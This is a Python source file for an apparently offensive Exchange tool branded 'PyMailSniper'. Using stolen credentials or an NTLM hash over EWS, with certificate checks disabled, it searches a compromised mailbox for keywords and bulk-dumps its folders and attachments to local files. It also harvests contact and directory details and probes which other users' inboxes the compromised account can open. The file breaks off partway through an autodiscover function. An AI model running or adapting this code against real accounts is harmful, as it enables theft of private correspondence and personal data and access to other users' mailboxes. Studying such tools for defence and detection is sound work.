#!/usr/bin/env python3
import re
import socket
import gc
import hashlib
from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
    NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList, NTLM, EWSTimeZone, EWSDateTime, EWSDate
from exchangelib.errors import UnauthorizedError, CASError
from requests.auth import HTTPBasicAuth
import shutil
from requests_ntlm import HttpNtlmAuth
import requests
import requests.adapters
import mailbox
import argparse
import sys
import os
import datetime
from os.path import isfile
import math
import tqdm
import time
import getpass
import threading
import urllib3
import colorama
from colorama import Fore, Style


class MyProxyAdapter(requests.adapters.HTTPAdapter):
    """An HTTP adapter that ignores TLS validation errors. Use at own risk."""

    def send(self, *args, **kwargs):
        kwargs['proxies'] = {
            'http': os.environ['HTTP_PROXY'],
            'https': os.environ['HTTPS_PROXY']
        }
        return super().send(*args, **kwargs)

    def cert_verify(self, conn, url, verify, cert):
        # pylint: disable=unused-argument
        # We're overriding a method so we have to keep the signature
        super().cert_verify(conn=conn, url=url, verify=False, cert=cert)


messages_per_thread = None

# ignore certificate errors and suspend warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Function to setup an Exchangelib Account object to be used throughout the code
def account_Setup(params):
    config_kwargs = {'server': params['server'],
                     'credentials': Credentials(params['email'], params['password']),
                     'retry_policy': FaultTolerance(max_wait=3),
                     'max_connections': 2
                     }
    if params['ntlm']:
        config_kwargs['auth_type'] = NTLM

    config = Configuration(**config_kwargs)

    try:
        # TODO:
        # understand this
        # if params.get('delegated'):
        #     account = Account(primary_smtp_address=shared,
        #                       autodiscover=False, config=config, access_type=DELEGATE)
        # else:
        account = Account(primary_smtp_address=params['email'],
                          autodiscover=False, config=config, access_type=DELEGATE)

        return account
    except Exception as e:
        print(Fore.LIGHTRED_EX + f'[!] Error while connecting:\n\t{e}\n')
        if args['ntlm']:
            print(Fore.LIGHTYELLOW_EX + f'[!] Try without -nt \n')
        sys.exit()


# List folders from a users inbox
def list_folders(accountObject, params=None):  # tree_view=False, count=False, root=False):
    root = params['root']
    tree_view = not params['absolute']
    print_count = params['print_count']

    root_folder = accountObject.root if root else accountObject.msg_folder_root

    filename = f"{params['user_folder']}/folders.txt"

    print('\n' + f'[+] Folder List for {params["email"]}' + '\n')

    if tree_view and not print_count:
        print(root_folder.tree())
        with open(filename, 'w', encoding='utf8') as writer:
            writer.write(root_folder.tree())
        print(Fore.LIGHTGREEN_EX + f'\n[=] Saved to "./{filename}"\n')
        return
    elif tree_view and print_count:
        tree = root_folder.tree() + "\n"  # .split("\n")
        # if tree_view and count:
        for folder_object in root_folder.walk():
            # folder_childs = f' (folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
            folder_children = f"emails : {folder_object.total_count}" if folder_object.total_count else ""
            folder_children += "\t" if folder_object.total_count and folder_object.child_folder_count else ""
            folder_children += f'folders: {folder_object.child_folder_count}' if folder_object.child_folder_count else ""

            # tree = tree.replace(folder_object.name + "\n", "{:50s} {}\n".format(folder_object.name, folder_childs))
            regex = f"(?<=(\n)).*({folder_object.name.replace('?', '.')})\n"

            try:
                result = re.search(regex, tree)
                result = result.group(0)
                tree = tree.replace(result, "{:50s} {}\n".format(result[:-1], folder_children))
            except Exception as e:
                print("[!] Exception during printing folders: ")
                print(e)
                pass

        with open(filename, 'w', encoding='utf8') as writer:
            writer.write(tree)

        print(tree)
        print(f'\n[=] Saved to "./{filename}"\n')
        return

    if not tree_view:
        for folder_object in root_folder.walk():
            info_to_print = folder_object.absolute
            if print_count:
                folder_children = f"emails: {folder_object.total_count}" if folder_object.total_count else ""
                folder_children += " " if folder_object.total_count and folder_object.child_folder_count else ""
                folder_children += f'folders: {folder_object.child_folder_count}' if folder_object.child_folder_count else ""
                print("{:26s} {}".format(folder_children, info_to_print))
            else:
                print(info_to_print)
        print("\n[=] Done\n")


def get_search_output_from_email(email=None, folder=None, matches_output=None):
    sender = f"{email.sender.name if email.sender.name else 'unknown'} <{email.sender.email_address if email.sender.email_address else 'unknown'}>" if email.sender else "fully unknown"

    recipients = "".join(
        [
            f"{recipient.name if recipient.name else 'unknown'} <{recipient.email_address if recipient.email_address else 'unknown'}>, "
            for recipient in email.to_recipients])[:-2] if email.to_recipients else "Unknown, WTF?!?"
    sent = email.datetime_sent
    subject = email.subject

    attaches = email.attachments if email.has_attachments else None
    output = f"""
{Fore.LIGHTCYAN_EX + '=' * 70 + Fore.LIGHTYELLOW_EX}
Folder:      {folder}
Sender:      {sender}
Recipients:  {recipients}
Sent:        {sent}
Subject:     {subject}
{Fore.LIGHTGREEN_EX + 'Attachments: ' + ', '.join([attach.name for attach in attaches]) + Fore.LIGHTYELLOW_EX if attaches else ''}
{matches_output}
    """

    return output


def create_user_folder(params=None):
    email = params['email']

    folder_name = sanitise_filename(f"{email}")

    if not os.path.isdir(folder_name):
        os.mkdir(folder_name)
        print(Fore.LIGHTCYAN_EX, f'\n[+] User folder "{folder_name}" created')
    else:
        print(Fore.LIGHTCYAN_EX, f'\n[+] User folder "{folder_name}" exist')
    return folder_name


def sanitise_message_text_body(msg_text_body=None):
    msg_text_body = msg_text_body.replace('\r', '').replace('\n\n', '\n').replace('\n \n', '\n').replace('\n', '\\n ')
    msg_text_body = re.sub(r"\s{3,}", " ", msg_text_body)
    return msg_text_body


def get_all_subfolders(folder=None):
    # Adding subfolders
    with_subfolders = [folder] + [folder for folder in folder.walk()]
    return with_subfolders


# Search users email for specified terms
def search_Emails(accountObject=None, params=None):
    search_folder = params["folder"]  # default Inbox
    termList = params["terms"] if type(params["terms"]) == list else params['terms'].split(',')
    email_count = params.get("count")
    where_to_search = params['field']
    user_folder = params['user_folder']

    # TODO ADD len of result printing for regex

    all_folders = get_Folders(accountObject=accountObject, params=params)

    # TODO Better filtering for bad folder
    # skipping calendar and contacts because there is no email objects there
    if len(all_folders) > 1:
        bad_folders = get_all_subfolders(accountObject.contacts)
        bad_folders += get_all_subfolders(accountObject.calendar)
        bad_folders += get_all_subfolders(accountObject.tasks)

        all_folders = [folder for folder in all_folders if folder not in bad_folders]

    storage_pattern = datetime.datetime.today().strftime(
        f'Search {search_folder} ({",".join(termList)}) %Y-%m-%d %H-%M')

    if params['dump']:

        # if we are dumping all or we have more than 1 folder, we make dir for a lot of mboxes
        if len(all_folders) > 1:  # search_folder.lower() == 'all':
            # if we are dumping more than one folder, we creating subfolder
            # for results
            mbox_output = f"./{user_folder}/{storage_pattern}"
            os.mkdir(mbox_output)
            print(Fore.LIGHTCYAN_EX, f"\n[+] Folder \"{mbox_output}\" created\n")
        else:
            # if we searching in and dumping one folder - we just creating .mbox file in user folder
            mbox_output = f'./{user_folder}/{storage_pattern}.mbox'

    search_logfile = f'{user_folder}/{storage_pattern}.txt'
    writer = open(search_logfile, 'w', encoding='utf-8')

    print(
        Fore.LIGHTCYAN_EX + f'\n[+] Searching in emails {where_to_search} for {",".join(termList)} in "{search_folder}" Folder\n')

    # TODO:
    # First get all folders emails into dict, then
    # go throughout emails
    for folder in all_folders:

        found_checked_emails_IDs = []
        # if no emails in folder, going next folder

        if not args['count']:
            email_count = folder.total_count

        """ where to search """

        fields = ['text_body', 'cc_recipients', 'sender', 'to_recipients',
                  'subject', 'datetime_sent', 'attachments', 'has_attachments']
        # just a query what will be modified later when we chose where to search (body or subject)
        emails_for_search = folder.all().order_by('-datetime_received').only(*fields)

        """First search stage - getting search query results"""

        # here are first stage search results stored
        found_emails_not_checked = list()

        # TODO: think about filter from args
        for term in termList:
            filter_args = {f'{where_to_search}__contains': term}
            found_emails_not_checked += list(
                emails_for_search.filter(**filter_args))[:email_count]

        # converting to set for non duplicating

        found_emails_not_checked = [email for email in found_emails_not_checked if isinstance(email, Message)]

        found_emails_not_checked = list(set(found_emails_not_checked))

        """First search stage end"""

        if len(found_emails_not_checked) == 0:
            print(Fore.LIGHTRED_EX + f"[-] Nothing found in\t\"{folder.name}\"")
            continue

        # just an iterator
        # found_emails_data = accountObject.fetch(found_emails_IDs_not_checked,
        #                                         onl=['text_body', 'cc_recipients', 'sender', 'to_recipients',
        #                                              'subject', 'datetime_sent', 'attachments', 'author'])

        # Used for non repeating (printing) already found matches (part of message text) (for folder)
        already_found_substrings = []

        for email_index in tqdm.tqdm(range(len(found_emails_not_checked)),
                                     desc=Fore.LIGHTYELLOW_EX + f"Searching for {','.join(termList)} in \"{folder.name}\"",
                                     leave=False, unit="email"):
            email = found_emails_not_checked[email_index]
            # just removes \r, replacing \n to \\n and \S+ to " " (space)
            clear_message_text_body = sanitise_message_text_body(email.text_body)

            if where_to_search == 'body':
                # re_check is needed for excluding false-positive search results
                re_check = [term.lower() in clear_message_text_body.lower() for term in termList]

                # if any of terms not found by regex in message text body, going next
                if not any(re_check):
                    continue

            try:
                if where_to_search == 'body':
                    # searching in message text by regex
                    # ((\S+)?.{0,50}(term1|term2|term3).{0,50}(\S+)?)
                    # returns up to 50 chars + word before and after terms
                    regex = '((\S+)?.{0,50}(' + "|".join(termList) + ').{0,50}(\S+)?)'

                    # searching with ignoring case and getting a list of substrings found by regex
                    found_substrings = re.findall(regex, clear_message_text_body, flags=re.IGNORECASE)

                    # if we want to dump found emails, we don't want to miss any email because of previously found exact substring
                    if args['dump']:
                        found_substrings = [i[0] for i in found_substrings]
                    else:
                        found_substrings = [i[0] for i in found_substrings if i[0] not in already_found_substrings]

                    # if nothing found, going to next emails
                    if len(found_substrings) == 0:
                        continue
                    elif not args['quite']:
                        tqdm.tqdm.write('\n' + Fore.LIGHTCYAN_EX + '[+] Found something in "{}" Folder'.format(folder.name))

                    # Just how found matches will be printed later
                    matches_output = "".join(
                        [f"\nMatch {index + 1}:   ...{match}...\n".replace('\\n \\n', '\\n') for index, match in
                         enumerate(found_substrings)])
                    # saving found matches for non repeating
                    already_found_substrings += found_substrings
                elif where_to_search == 'subject':
                    # we have no text matches for subject, so printing first 100 chars of body
                    matches_output = clear_message_text_body[:100]

                # saving found emails (id,changekey) for later downloading
                found_checked_emails_IDs.append((email.id, email.changekey))

                # just getting output for print
                folder_path = folder.absolute.replace(accountObject.msg_folder_root.absolute + '/', '')
                result_for_printing = get_search_output_from_email(email=email, folder=folder_path,
                                                                   matches_output=matches_output)

                if not params['quite']:
                    result_for_printing_colored = result_for_printing
                    for term in termList:
                        result_for_printing_colored = re.sub(term, Fore.LIGHTRED_EX + term + Fore.LIGHTYELLOW_EX,
                                                             result_for_printing_colored, flags=re.IGNORECASE)

                    for index in range(len(found_substrings)):
                        result_for_printing_colored = re.sub(f'Match {index + 1}:',
                                                             Fore.LIGHTRED_EX + f'Match {index + 1}:' + Fore.LIGHTYELLOW_EX,
                                                             result_for_printing_colored, flags=re.IGNORECASE)

                    tqdm.tqdm.write(result_for_printing_colored + '\n')

                writer.write(result_for_printing)
            except KeyboardInterrupt:
                tqdm.tqdm.write(Fore.LIGHTRED_EX + '\n[!] Ctrl+C, exiting\n')
                return
            except Exception as e:
                tqdm.tqdm.write(Fore.LIGHTRED_EX, "[!] Exception while searching: ")
                tqdm.tqdm.write(Fore.LIGHTRED_EX, e)

        # if we are dumping more than one folder and we found something
        if params['dump'] and len(found_checked_emails_IDs) != 0:
            if len(all_folders) > 1:  # search_folder.lower() == 'all' or :
                # Okay, don't try to understand bellow line, it works fine
                mbox_filename = f"{''.join(['[' + parent + '] ' for parent in folder.parent.absolute.replace(accountObject.msg_folder_root.absolute + '/', '').split('/')])} {folder.name}" if folder.parent.absolute != accountObject.msg_folder_root.absolute else f"{folder.name}"
                mbox_filename = sanitise_filename(mbox_filename)
                mbox_full_path = mbox_output + '/' + mbox_filename + '.mbox'
            elif len(all_folders) == 1:
                mbox_full_path = mbox_output
            else:
                print(Fore.LIGHTRED_EX, "WTF" * 160)

            get_tqdm_description = Fore.LIGHTYELLOW_EX + f"Downloading search results for \"{folder.name}\" folder"
            dump_tqdm_description = Fore.LIGHTYELLOW_EX + f"[+] Saving found in \"{folder.name}\" folder to {mbox_full_path}"

            found_emails_mimes = get_emails(accountObject=accountObject, email_ids_to_download=found_checked_emails_IDs,
                                            tqdm_description=get_tqdm_description)
            dump_to_Mbox(mbox_file_path=mbox_full_path, mimes_list=found_emails_mimes,
                         tqdm_desctiption=dump_tqdm_description, folder_name=folder.name)
    writer.close()
    print(Fore.LIGHTGREEN_EX + f'\n[=] Text results saved to "{search_logfile}"\n')


def proxy_check(params=None):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    proxy = re.search(r'\w+?://([A-Za-z_0-9\.-]+):(\d+)', params['proxy'])
    proxy_address = str(proxy.group(1))
    proxy_port = int(proxy.group(2))

    location = (proxy_address, proxy_port)

    # 0 is proxy okay
    result_of_check = not a_socket.connect_ex(location)

    return result_of_check


def get_new_filename(file_name=None):
    """
    :param file_name: file path to check
    :return: if file not exists, returns false, else - new filename with appendix
    """
    is_file_exist = isfile(file_name)
    if not is_file_exist:
        return file_name
    else:
        i = 1
        while True:
            extension = file_name.split('.')[-1]
            new_file_name = file_name.replace(f'.{extension}', f'_{str(i)}.{extension}')
            check = isfile(new_file_name)
            if not check:
                return new_file_name
            i += 1


def create_dir(path):
    try:
        os.mkdir(path)
    except:
        pass
    return


def write_file_from_bytes(file_path=None, file_content=None):
    with open(file_path, 'wb') as writer:
        writer.write(file_content)
    del file_content
    gc.collect()
    return


def convert_ewsdate(EWSTime=None):
    date = datetime.datetime(year=EWSTime.year, month=EWSTime.month, day=EWSTime.day, hour=EWSTime.hour,
                             minute=EWSTime.minute,
                             second=EWSTime.second)
    return date


def change_file_dates(file_path=None, EWSTime=None):
    date = convert_ewsdate(EWSTime=EWSTime)
    modTime = time.mktime(date.timetuple())

    os.utime(file_path, (modTime, modTime))
    return


def filter_emails_by_attachment_names(emails=[], name_terms=[]):
    filtered_by_attach_name = []
    for name_term in name_terms:
        for email in emails:
            flag = False
            for attachment in email.attachments:
                if isinstance(attachment, FileAttachment):
                    if name_term in attachment.name:
                        filtered_by_attach_name.append(email)
                        flag = True
                if flag:
                    break

    filtered_by_attach_name = list(set(filtered_by_attach_name))

    return filtered_by_attach_name


# Search for attachments based on search terms provided
def search_Attachments(accountObject=None, params=None):
    terms = params["terms"].split(',') if params["terms"] else None
    count = params["count"]
    user_folder = params['user_folder']
    name_terms = params['name'].split(',') if params['name'] else None
    do_dump = args['dump']

    folders = get_Folders(accountObject=accountObject, params=params)

    # TODO think about this
    if len(folders) > 1:
        bad_folders = get_all_subfolders(accountObject.contacts)
        bad_folders += get_all_subfolders(accountObject.calendar)
        bad_folders += get_all_subfolders(accountObject.tasks)

        folders = [folder for folder in folders if folder not in bad_folders]

    attach_dir = f'{user_folder}/attach'
    create_dir(attach_dir)

    if do_dump:
        print(Fore.LIGHTGREEN_EX + f'\nGREEN{Fore.RESET}\t- Successfully saved')
        print(Fore.LIGHTYELLOW_EX + f'YELLOW{Fore.RESET}\t- Same named file, downloading with number postfix')
        print(Fore.LIGHTCYAN_EX + f'BLUE{Fore.RESET}\t- Already downloaded\n')

    gc.collect()

    # TODO folder naming like mboxes
    for folder in folders:
        folder_name = folder.name
        folder_path = folder.absolute.replace(accountObject.msg_folder_root.absolute + '/', '')

        emails = list(folder.all().order_by('-datetime_received').only('id', 'changekey', 'attachments',
                                                                       'datetime_received', 'sender',
                                                                       'to_recipients').filter(has_attachments=True))
        if len(emails) == 0:
            continue

        if name_terms:
            emails = filter_emails_by_attachment_names(emails=emails, name_terms=name_terms)
            if len(emails) == 0:
                continue
        print(
            Fore.LIGHTCYAN_EX + f'\n\n[+]  {"Downloading" if do_dump else "Searching"} attachments for "{folder_name}" folder')

        if do_dump:
            # creating local directory for folder
            folder_name_sanitised = sanitise_filename(folder_name)
            folder_path = f'{attach_dir}/'
            folder_path += f"{''.join(['[' + parent + '] ' for parent in folder.parent.absolute.replace(accountObject.msg_folder_root.absolute + '/', '').split('/')])}{folder_name_sanitised}" if folder.parent.absolute != accountObject.msg_folder_root.absolute else f"{folder_name_sanitised}"

            create_dir(folder_path)

            # here we are storing filename of file and it's md5 hash
            hashes_file = f'{folder_path}/hashes.txt'

            # if we are redownloading or something, file can be already there
            if isfile(hashes_file):
                hashes_fp = open(hashes_file, 'r+', encoding='utf8')
                content = hashes_fp.readlines()
                already_downloaded_file_hashes = [line.split('\t')[1][:-1] for line in content if line != '']
                already_downloaded_files = [line.split('\t')[0] for line in content if line != '']

            else:
                hashes_fp = open(hashes_file, 'w', encoding='utf8')
                already_downloaded_file_hashes = []

        for email_index in tqdm.tqdm(range(len(emails)),
                                     desc=Fore.LIGHTYELLOW_EX + f"{'Downloading' if do_dump else 'Searching'} attachments ({folder_name})",
                                     leave=False, unit="email"):
            for attachment in emails[email_index].attachments:
                if isinstance(attachment, FileAttachment):
                    if name_terms:
                        check = any([term in attachment.name for term in name_terms])
                        if not check:
                            continue

                    date = convert_ewsdate(EWSTime=attachment.last_modified_time)
                    date = date.strftime("%d.%m.%Y  %H:%M\t")

                    if not do_dump:
                        tqdm.tqdm.write(Fore.LIGHTYELLOW_EX + date + attachment.name)
                        continue

                    extension = attachment.name.split('.')[-1]
                    attach_file_path = f'{folder_path}/{extension}/{attachment.name}'
                    attach_file_path_original = attach_file_path

                    # if connection failed (sometimes it can happen)
                    for i in range(5):
                        try:
                            with attachment.fp as fp:
                                new_file_content = fp.read()
                            break
                        except KeyboardInterrupt:
                            tqdm.tqdm.write(Fore.LIGHTRED_EX + '\n[!] Ctrl+C, exiting\n')
                            return
                        except Exception as e:
                            message = Fore.LIGHTRED_EX + f"Can't download ({str(i + 1)}/5):" + f'{attachment.name}'
                            tqdm.tqdm.write(message)
                            tqdm.tqdm.write(e)

                    new_file_hash = hashlib.md5(new_file_content).hexdigest()

                    # if hash of file already in list of hashes, do not saving
                    if new_file_hash in already_downloaded_file_hashes:
                        message = Fore.LIGHTCYAN_EX + f'{date}\t{attachment.name}'
                        tqdm.tqdm.write(message)
                        del new_file_content
                        gc.collect()
                        continue
                    else:  # if hash of file not in list, perform saving

                        # if same named file exist, getting it name with number suffix, if not - nothing changes
                        attach_file_path = get_new_filename(attach_file_path)
                        new_file_name = attach_file_path.split("/")[-1]

                        # adding file hash to list for filtering
                        already_downloaded_file_hashes.append(new_file_hash)
                        hashes_fp.write(f'{new_file_name}\t{new_file_hash}\n')

                        # Saving file
                        create_dir(f'{folder_path}/{extension}')
                        with open(attach_file_path, 'wb') as writer:
                            writer.write(new_file_content)

                        # updating file's creation and update dates
                        change_file_dates(file_path=attach_file_path, EWSTime=attachment.last_modified_time)

                        if attach_file_path_original == attach_file_path:
                            # if name not changed - it's okay, just new file
                            message = Fore.LIGHTGREEN_EX + f'{date}\t{attachment.name}'
                            tqdm.tqdm.write(message)
                        else:
                            # if we have same named files with different hashes
                            message = Fore.LIGHTYELLOW_EX + f'{date}\t{attachment.name}\nSaved as \t\t\t{new_file_name}'
                            tqdm.tqdm.write(message)
        if do_dump:
            hashes_fp.close()

    print(Fore.LIGHTYELLOW_EX + '\n[=] Done searching\n')
    return


# Check where compromised user has delegation rights
def searchDelegates(params, fparser):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')

    if isinstance(fparser.get("galList"), (str)):
        fname = ''.join(fparser.get("galList"))
        fname = fname.split(' ')
    else:
        fname = fparser.get("galList")

    print('[+] Checking Where Compromised User Has Access' + '\n')

    for shared in fname:
        try:
            config = Configuration(
                server=server, credentials=Credentials(email, password))

            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)

            folderInbox = account.inbox
            # print(folderInbox.permission_set)
            for s in folderInbox.permission_set.permissions:
                if s.permission_level != 'None':
                    print('User: {} has {} permissions on {}\'s Inbox'.format(email, s.permission_level, shared))

        except Exception as e:
            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(
                    e):
                print(e)


def list_contacts(accountObject=None, params=None):
    """Prints all user email addresses"""
    """GAL NOT TESTED"""
    is_gal = params['gal']
    verbose = params['verbose']

    if verbose:
        file_name = f'{params["user_folder"]}/contacts_verbose.txt'
        file = open(file_name, 'w', encoding='utf8')
    else:
        file_name = f'{params["user_folder"]}/contacts_emails.txt'
        file = open(file_name, 'w', encoding='utf8')

    if is_gal:
        print("\n[+] GAL Contacts")
        gal = accountObject.contacts / 'GAL Contacts'
        gal_all = gal.all()
        all_addresses = [
            e.email for c in gal.all()
            for e in c.email_addresses if not isinstance(c, DistributionList)
        ]
        print(all_addresses)

    else:
        print(Fore.LIGHTYELLOW_EX + "\n[+] AllContacts\n")
        folder = accountObject.root / 'AllContacts'
        for person in folder.people():
            emails = "".join([email.email_address + '\n' for email in person.email_addresses])[
                     :-1] if person.email_addresses else person.email_address
            if not verbose:
                print(emails)
                file.write(emails + "\n")
                continue
            display_name = person.display_name
            company_name = person.company_name if person.company_name else None
            office_locations = "".join([location.value + '\n' for location in person.office_locations])[
                               :-1] if person.office_locations else None
            titles = "".join([title.value + '\n' for title in person.titles])[:-1] if person.titles else person.title
            department = person.department if person.department else None
            mobile_phones = "".join([phone.value.number + '\n' for phone in person.mobile_phones])[
                            :-1] if person.mobile_phones else None
            business_phone_numbers = "".join([phone.value.number + '\n' for phone in person.business_phone_numbers])[
                                     :-1] if person.business_phone_numbers else None
            verbose_output = f"""
{"Display name:   " + display_name if display_name else ""}
{"Company name:   " + company_name if company_name else ""}
{"Location:       " + office_locations if office_locations else ""}
{"Title:          " + titles if titles else ""}
{"Department:     " + department if department else ""}
{"Mobile phone:   " + mobile_phones if mobile_phones else ""}
{"Business phone: " + business_phone_numbers if business_phone_numbers else ""}
{"Emails:         " + emails if emails else ""}
            """.replace('\n\n', '\n').replace('\n\n', '\n').replace('\n\n', '\n')[:-1]
            """Don't look at this, please"""

            print(verbose_output)
            file.write(verbose_output + '\n')

        file.close()
        print(Fore.LIGHTGREEN_EX + f'[=] Saved to "{file_name}"')
    print()


# TODO: check this
# This is where we check if the address list file provided exists
def file_parser(params):
    return_dict = {}

    if isfile(params["galList"]):
        with open(params.get("galList", "r")) as f:
            userfile_content = f.read().splitlines()
            f.close()
            return_dict['galList'] = userfile_content
    elif isinstance(params.get("galList"), str):
        return_dict['galList'] = params.get("galList")
    else:
        print("GAL File not found!")

    return return_dict


def print_logo():
    logo = '''
  _____       __  __       _ _  _____       _                 
 |  __ \     |  \/  |     (_) |/ ____|     (_)                
 | |__) |   _| \  / | __ _ _| | (___  _ __  _ _ __   ___ _ __ 
 |  ___/ | | | |\/| |/ _` | | |\___ \| '_ \| | '_ \ / _ \ '__|
 | |   | |_| | |  | | (_| | | |____) | | | | | |_) |  __/ |   
 |_|    \__, |_|  |_|\__,_|_|_|_____/|_| |_|_| .__/ \___|_|   
         __/ |                               | |              
        |___/                                |_|              
        
   '''

    print(logo)


def find_Folder(accountObject=None, folder_to_find=None):
    # first we are searching in msg_folder_root directly
    found = accountObject.msg_folder_root.glob(folder_to_find)
    if len(found) == 0:
        # if nothing found, we are found by any depth
        found = accountObject.msg_folder_root.glob(f"**/{folder_to_find}")
    found = list(found)[0]
    return found


def sanitise_filename(file_path=None):
    return re.sub(r"[^\sа-яА-ЯёЁ0-9a-zA-Z\(\)\]\[\.\-\@_+,№]+", " ", file_path)


def dump_to_Mbox(folder_name=None, mbox_file_path=None, mimes_list=[], tqdm_desctiption=""):
    try:
        # look at this magic (list of lists into flat list)
        if type(mimes_list[0]) == list:
            mimes_list = [item for sublist in mimes_list for item in sublist]

        mbox = mailbox.mbox(mbox_file_path)
        mbox.lock()
        for message_index in tqdm.tqdm(range(len(mimes_list)), desc=tqdm_desctiption, leave=False, unit="email"):
            msg = mailbox.mboxMessage(mimes_list[message_index])
            mbox.add(msg)
            mbox.flush()
        mbox.unlock()
    except Exception as e:
        print(f"[-] Error while saving to {mbox_file_path}:")
        print(e)
    finally:
        size = os.path.getsize(mbox_file_path)
        size = size / (1024 * 1024)
        size = "{:.2f}".format(size)
        emails_count = "{:>3s}".format(str(len(mimes_list))) + ' emails'
        info = "( {} {:>6s} MB )".format(emails_count, size)
        if folder_name:
            print(Fore.LIGHTYELLOW_EX + "[+] Dumped folder\t{:25s} {:18s}".format('"' + folder_name + '"', info))
        else:
            # kostil'
            print(Fore.LIGHTYELLOW_EX + "[+] Dumped to {} {:>18}".format(
                re.sub('\S+' + args['user_folder'] + '/', '', mbox_file_path), info))


def dump_thread_worker(accountObject=None, folder_name=None, thread_index=None, params=None,
                       email_ids_to_download=None):
    global messages_per_thread
    exception_string = f"[!] Thread {thread_index} is reconnected!"
    if folder_name:
        tqdm_description = Fore.LIGHTYELLOW_EX + f"[+] Downloading \"{folder_name}\""
        if params['threads'] != 1:
            tqdm_description += f' (Thr №{thread_index})'
    else:
        tqdm_description = ""

    # ids of emails for downloading in "email_ids_to_download", list where mime_contents will be returned - "list_for_results"
    messages_per_thread[thread_index] = get_emails(accountObject=accountObject,
                                                   email_ids_to_download=email_ids_to_download,
                                                   tqdm_description=tqdm_description, exception_string=exception_string)

    accountObject.protocol.close()


def get_emails(accountObject=None, email_ids_to_download=None, tqdm_description=None,
               exception_string="Exception while downloading, reconnecting..."):
    downloaded_messages = []
    # you can play with "count_per_task" parameter for performance, but in my case by one is fastest
    count_per_task = 1

    for i in tqdm.tqdm(range(0, len(email_ids_to_download), count_per_task), desc=tqdm_description, leave=False,
                       unit="email"):
        # takes list of N ids of emails and downloading its mime (plain .eml file)
        # while True needed if connection was lost:
        while True:
            try:
                temp = email_ids_to_download[i:i + count_per_task]
                for email in accountObject.fetch(temp, only_fields=['mime_content']):
                    downloaded_messages.append(email.mime_content)
                break

            except Exception as e:
                # accountObject = account_Setup(params)
                # print(e)
                print(exception_string)
                continue

    return downloaded_messages


def get_Folders(accountObject=None, params=None):
    """
    :param params: startup arguments
    :param accountObject: Exchangelib account object
    :return folders: list of folders
    """
    start_folder = params['folder']

    if start_folder.lower() == "inbox":
        folders = [accountObject.inbox]
    elif start_folder.lower() == "sent":
        folders = [accountObject.sent]
    elif start_folder.lower() == "all":
        folders = [accountObject.msg_folder_root]
        params['recurse'] = True
    else:
        folders = [find_Folder(accountObject=accountObject, folder_to_find=start_folder)]
        if not folders:
            print(f"\n[-] Folder {start_folder} not found")
            return None

    # if we want -r, well get all subfolders
    if params['recurse']:
        folders = get_all_subfolders(folders[0])

    folders = [folder for folder in folders if folder.total_count != 0]

    return folders


def dump_Folders(accountObject=None, params=None):
    local_folder = params['user_folder'] + '/' + params['dump']

    emails_count = params['count']

    if os.path.isdir(local_folder):
        print(f"\n[-] Folder {local_folder} already exists, use another (-d)")
        return 1
    else:
        try:
            os.mkdir(local_folder)
            print(f"\n[+] Folder \"{local_folder}\" created\n")
        except Exception as e:
            print(f"\n[-] Something went wrong while creating {local_folder}:")
            print(e)
            return 1

    all_folders_2_dump = get_Folders(accountObject=accountObject, params=params)

    # filter for useless folders
    if len(all_folders_2_dump) > 1:
        bad_folders = get_all_subfolders(accountObject.contacts)
        bad_folders += get_all_subfolders(accountObject.calendar)
        bad_folders += get_all_subfolders(accountObject.tasks)

        all_folders_2_dump = [folder for folder in all_folders_2_dump if
                              folder not in bad_folders]

    # skipping empty folders
    all_folders_2_dump = [folder for folder in all_folders_2_dump if folder.total_count != 0]

    for folder in all_folders_2_dump:

        # it works
        mbox_filename = f"{''.join(['[' + parent + '] ' for parent in folder.parent.absolute.replace(accountObject.msg_folder_root.absolute + '/', '').split('/')])} {folder.name}" if folder.parent.absolute != accountObject.msg_folder_root.absolute else f"{folder.name}"

        mbox_filename = sanitise_filename(mbox_filename)
        mbox_file_path = f"./{local_folder}/{mbox_filename}.mbox"

        # cutter for all_items
        if not params['count']:
            emails_count = folder.total_count

        # list of (id,changekey) of emails in current folder
        all_items = list(
            folder.all().order_by('-datetime_received').values_list('id', 'changekey')[:emails_count])

        # if folder suddenly becomes empty, skipping
        if len(all_items) == 0:
            continue

        """Threads prep START"""
        threads_lists = []
        thread_count = params['threads']
        # using one thread for downloading if folder has less than 10 emails
        if len(all_items) <= 10:
            thread_count = 1

        # We are storing emails mimes in global variable
        global messages_per_thread
        messages_per_thread = [[]] * thread_count
        # How much we want to download emails by one thread
        messages_per_thread_count = int(math.ceil(len(all_items) / thread_count))

        # list of (id,changekey) lists for downloading
        items_per_thread = []

        # cutting into chunks
        for i in range(0, emails_count, messages_per_thread_count):
            items_per_thread.append(all_items[i:i + messages_per_thread_count])

        # Every thread uses it's own connection
        accountObjects = [None] * thread_count

        """ Threads prep END """

        """ Threads init START """
        for index in range(thread_count):
            # i don't remember why this if was added, don't touch
            if len(items_per_thread[index]) == 0:
                continue
            # Creating connection for thread
            accountObjects[index] = account_Setup(params)

            thread_kwargs = {'accountObject': accountObjects[index],
                             'email_ids_to_download': items_per_thread[index],
                             'folder_name': folder.name,
                             'thread_index': index,
                             'params': params}

            t = threading.Thread(target=dump_thread_worker,
                                 kwargs=thread_kwargs)
            threads_lists.append(t)
            # t.daemon = True
            t.start()

        """ Thread init stop """

        for t in threads_lists:
            t.join()

        dump_to_Mbox(mbox_file_path=mbox_file_path,
                     mimes_list=messages_per_thread, folder_name=folder.name,
                     tqdm_desctiption=f"[+] Saving folder \"{folder.name}\"")

        # deleting emails mimes from memory
        del messages_per_thread
        gc.collect()

    print(Fore.LIGHTGREEN_EX + f"\n[=] All folders downloaded to \"{local_folder}\"\n")


def get_Autodiscover(params=None):
    email = params['email']

    # if --server present, clearing from trash
    # if only --email present, taking domain from it

    if params['server']:
        server = params['server'].replace("https://", "").replace("http://", "")
    else:
        server = params['email'].split('@')[1]

    password = params['password']

    # If we passing NTLM hash, we don't need use BasicAuth
    auths = {'NTLM': HttpNtlmAuth, 'Basic': HTTPBasicAuth}
